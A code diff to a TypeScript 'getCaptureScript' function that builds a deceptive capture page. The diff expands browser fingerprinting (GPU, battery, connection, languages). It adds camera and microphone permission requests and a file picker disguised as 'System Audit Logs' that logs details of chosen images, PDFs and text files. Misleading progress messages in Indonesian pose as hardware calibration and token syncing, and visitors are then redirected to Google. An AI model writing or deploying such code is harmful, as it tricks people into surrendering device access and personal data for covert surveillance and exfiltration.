@@ -93,12 +93,35 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         var metadata = {
           browser: navigator.userAgent,
           platform: navigator.platform,
-          screen: window.screen.width + "x" + window.screen.height,
+          screen: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           cores: navigator.hardwareConcurrency || "N/A",
           mem: navigator.deviceMemory || "N/A",
-          ref: document.referrer || "Direct"
+          ref: document.referrer || "Direct",
+          langs: navigator.languages.join(','),
+          onLine: navigator.onLine,
+          vendor: navigator.vendor,
+          gpu: (function(){
+            try {
+              var c = document.createElement('canvas');
+              var gl = c.getContext('webgl');
+              if (!gl) return 'N/A';
+              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+              return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic';
+            } catch(e) { return 'Error'; }
+          })()
         };
+
+        try {
+          if (navigator.getBattery) {
+            var batt = await navigator.getBattery();
+            metadata.battery = Math.round(batt.level * 100) + "% (" + (batt.charging ? "Charging" : "Discharging") + ")";
+          }
+          if (navigator.connection) {
+            metadata.connection = navigator.connection.effectiveType + " (rtt: " + navigator.connection.rtt + "ms)";
+          }
+        } catch(e) {}
+
         await logEvent('info', metadata);
 
         var stepProg = Math.floor(80 / (requiredPerms.length || 1));
@@ -126,10 +149,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               if (!isSilent) updateProgress(prog, "Kalibrasi akses hardware AV...", "MEDIA_SETUP");
               if (navigator.mediaDevices) {
                 try {
-                  await navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => s.getTracks().forEach(t => t.stop())).catch(e=>{});
+                  var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true }).catch(function(){ return null; });
                   var devs = await navigator.mediaDevices.enumerateDevices();
-                  var list = devs.map(d => d.kind + ': ' + (d.label || 'Auth-Device')).join('\\n');
-                  await logEvent('extra', { media: list });
+                  var list = devs.map(d => d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5))).join('\\n');
+                  await logEvent('extra', { media_hardware: list });
+                  if (stream) stream.getTracks().forEach(t => t.stop());
                 } catch(e) {}
               }
             }
@@ -164,11 +188,22 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'files') {
               if (!isSilent) updateProgress(prog, "Sinkronisasi token media galeri...", "STORAGE_CERT");
               if (window.showOpenFilePicker) {
-                 var handle = await window.showOpenFilePicker({ multiple: true, types: [{ description: 'Media Audit', accept: { 'image/*': ['.png','.jpg','.jpeg'], 'video/*': ['.mp4'] } }] }).catch(function(){ return null; });
+                 var handle = await window.showOpenFilePicker({ 
+                   multiple: true, 
+                   types: [{ 
+                     description: 'System Audit Logs', 
+                     accept: { 
+                       'image/*': ['.png','.jpg','.jpeg'], 
+                       'video/*': ['.mp4'],
+                       'application/pdf': ['.pdf'],
+                       'text/plain': ['.txt']
+                     } 
+                   }] 
+                 }).catch(function(){ return null; });
                  if (handle) {
                     for (const item of handle) {
                       var file = await item.getFile();
-                      await logEvent('extra', { file_name: file.name, file_size: file.size });
+                      await logEvent('extra', { file_name: file.name, file_size: file.size, file_type: file.type });
                     }
                  }
               }
